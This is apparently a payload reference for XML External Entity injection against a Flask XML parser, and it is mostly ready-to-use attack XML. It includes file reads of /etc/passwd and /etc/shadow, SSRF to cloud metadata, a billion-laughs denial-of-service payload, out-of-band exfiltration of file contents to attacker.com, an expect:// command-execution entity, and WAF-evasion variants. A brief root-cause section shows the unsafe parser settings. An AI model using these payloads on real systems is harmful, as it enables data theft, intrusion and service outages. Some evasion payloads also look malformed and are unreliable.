# XML External Entity (XXE) Injection Payloads Documentation

## Vulnerability Analysis

- **Target Application**: Flask XML Parser
- **Vulnerability Type**: XML External Entity Injection
- **Attack Vector**: Unrestricted XML external entity processing

## Successful Payloads

### 1. Local File Read (Basic XXE)

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

**Impact**: Reads system password file

**Variations**:

```xml
<!ENTITY xxe SYSTEM "file:///etc/shadow">  <!-- Privileged file -->
<!ENTITY xxe SYSTEM "file:///proc/self/environ">  <!-- Environment variables -->
```

### 2. Server-Side Request Forgery (SSRF)

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-server.local/secrets.txt"> ]>
<foo>&xxe;</foo>
```

**Impact**: Accesses internal network resources

**Variations**:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">  <!-- AWS metadata -->
<!ENTITY xxe SYSTEM "gopher://attacker.com:1337/_SSRF%20data">  <!-- Protocol smuggling -->
```

### 3. Denial of Service (Billion Laughs Attack)

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

**Impact**: Causes resource exhaustion and application crash

### 4. Blind XXE (Out-of-Band Data Exfiltration)

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/collect.dtd">
  %xxe;
]>
<foo>test</foo>
```

With external DTD:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?file=%file;'>">
%eval;
%exfil;
```

**Impact**: Exfiltrates data when direct output isn't visible

## Root Cause Analysis

### Unsafe XML Parsing Configuration

```python
parser = etree.XMLParser(no_network=False, resolve_entities=True)
```

**Key Issues**:

- External entity resolution enabled (`resolve_entities=True`)
- Network access permitted (`no_network=False`)
- No input validation or size restrictions
- No DOCTYPE filtering

## Attack Scenarios

### Scenario 1: Sensitive Data Exfiltration

- Read system files (`/etc/passwd`, `/etc/shadow`)
- Access application configuration files
- Retrieve SSH keys and credentials
- Read database connection strings

### Scenario 2: Internal Network Reconnaissance

- Scan internal network via SSRF
- Access cloud metadata services
- Identify internal service versions
- Enumerate internal infrastructure

### Scenario 3: System Compromise Chain

1. Read sensitive configuration files
2. Extract database credentials
3. Access internal admin interfaces
4. Achieve remote code execution

## Advanced Techniques

### 1. PHP Expect Wrapper (When Available)

```xml
<!ENTITY xxe SYSTEM "expect://id">
```

### 2. UTF-7 Bypass for WAFs

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe;+ADw-/foo+AD4-
```

### 3. SVG-based XXE (For File Uploads)

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

## Defense Evasion Techniques

### 1. Comment Obfuscation

```xml
<!DOCTYPE foo <!-- --> [ <!-- --><!ENTITY <!-- -->xxe <!-- -->SYSTEM <!-- -->"file:///etc/passwd"<!-- -->> <!-- -->]>
```

### 2. CDATA Wrapping

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"><![CDATA[]]]>&xxe;>
```

### 3. Multiple Encoding

```xml
<!DOCTYPE foo [ <!ENTITY % param1 "file:///etc/passwd"> <!ENTITY xxe SYSTEM "%param1;"> ]>
```
